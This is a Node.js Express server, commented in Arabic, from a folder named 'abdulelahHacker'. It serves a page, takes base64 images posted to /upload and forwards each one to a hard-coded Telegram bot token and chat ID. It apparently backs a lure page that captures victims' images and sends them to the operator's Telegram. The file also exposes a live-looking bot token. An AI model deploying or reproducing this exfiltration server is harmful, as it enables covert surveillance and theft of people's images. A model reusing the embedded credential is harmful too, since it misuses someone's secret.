const express = require('express');
const https = require('https');
const fs = require('fs');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(bodyParser.json({ limit: '10mb' }));

// استبدل بمسار مفتاحك الخاص والشهادة
const options = {
  key: fs.readFileSync('C:/Users/bwdy1/Desktop/abdulelahHacker/private-key.pem'), // المسار الصحيح للمفتاح الخاص
  cert: fs.readFileSync('C:/Users/bwdy1/Desktop/abdulelahHacker/certificate.pem') // المسار الصحيح للشهادة
};

// وضع التوكن الخاص بك هنا
const TELEGRAM_BOT_TOKEN = '7944784035:AAG9QlBrJP4snXb3AxtZv-BiPbWZ3tzHYtU';
const TELEGRAM_CHAT_ID = '452567629'; // معرف المستخدم الخاص بك

// دالة لإرسال الصورة إلى بوت تليجرام
const sendPhotoToTelegram = async (photoPath) => {
  const formData = {
    chat_id: TELEGRAM_CHAT_ID,
    photo: fs.createReadStream(photoPath),
  };

  try {
    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
      headers: {
        'Content-Type': 'multipart/form-data'
      }
    });
    console.log('تم إرسال الصورة إلى تليجرام بنجاح:', response.data);
  } catch (error) {
    console.error('خطأ في إرسال الصورة إلى تليجرام:', error.response ? error.response.data : error.message);
  }
};

// إضافة مسار للجذر لإرسال ملف index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html')); // تأكد أن index.html موجود في نفس المجلد
});

// هنا تابع الكود كما هو
app.post('/upload', (req, res) => {
  const imgData = req.body.image;
  const base64Data = imgData.replace(/^data:image\/png;base64,/, "");

  const imagePath = "uploaded_image.png";
  fs.writeFile(imagePath, base64Data, 'base64', function(err) {
    if (err) {
      console.log(err);
      return res.status(500).send('خطأ في حفظ الصورة');
    }
    console.log('تم حفظ الصورة بنجاح');

    // إرسال الصورة إلى تليجرام
    sendPhotoToTelegram(imagePath);

    res.status(200).send({ message: 'تم استلام الصورة وإرسالها إلى تليجرام' });
  });
});

// تشغيل الخادم على المنفذ 443 لـ HTTPS
https.createServer(options, app).listen(8080, () => {
  console.log('ok 8080');
});
